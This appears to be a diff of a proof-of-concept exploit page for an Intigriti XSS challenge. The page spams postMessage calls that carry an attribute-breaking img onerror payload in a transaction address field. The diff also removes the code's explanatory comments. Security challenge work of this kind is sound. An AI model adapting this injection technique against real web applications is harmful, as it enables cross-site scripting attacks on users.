@@ -6,7 +6,7 @@
 <body>
     <h2>Exploit Running...</h2>
     <div id="status">Initializing...</div>
-    <button onclick="startExploit()">Click if popup blocked</button>
+    <button onclick="startExploit()">Click me</button>
 
     <script>
         const targetUrl = "https://challenge-0126.intigriti.io/checkout.html";
@@ -22,38 +22,27 @@
             // Open the checkout page
             var win = window.open(targetUrl, "targetWindow");
 
-            // PAYLOAD EXPLANATION:
-            // 1. "0x" prefix: Attempts to bypass simple "starts with 0x" regex validation.
-            // 2. ">: Closes the title attribute in marketwatch.html.
-            // 3. <img src=x onerror=...>: The standard innerHTML XSS vector.
-            // 4. confirm(origin): Uses confirm instead of alert (sometimes less filtered).
-            // 5. Padding: Adds random hex to look like a real address length if checked.
             const xssPayload = "0x\"><img src=x onerror=alert(document.domain)>";
 
             const message = {
                 type: "submitTransaction",
                 transaction: {
-                    currency: "BTC", // Assuming victim has BTC wallet (default)
+                    currency: "1337COIN",
                     amount: 0.00000001, 
                     toAddress: xssPayload
                 }
             };
 
-            // SPAMMER LOGIC:
-            // We don't know when the victim's wallet list is loaded.
-            // We send the message every 500ms for 10 seconds to ensure it hits.
             let counter = 0;
             const interval = setInterval(() => {
                 try {
                     win.postMessage(message, "*");
                     log(`Message sent (Attempt ${++counter})...`);
                     
-                    // Stop after 20 attempts (10 seconds)
                     if (counter > 20) {
                         clearInterval(interval);
                         log("Exploit phase complete. Redirecting to check result...");
                         
-                        // Redirect the PoC window to marketwatch to verify
                         setTimeout(() => {
                             win.location.href = marketWatchUrl;
                         }, 1000);
@@ -64,7 +53,6 @@
             }, 500);
         }
 
-        // Auto-start
         window.onload = function() {
             setTimeout(startExploit, 1000);
         }
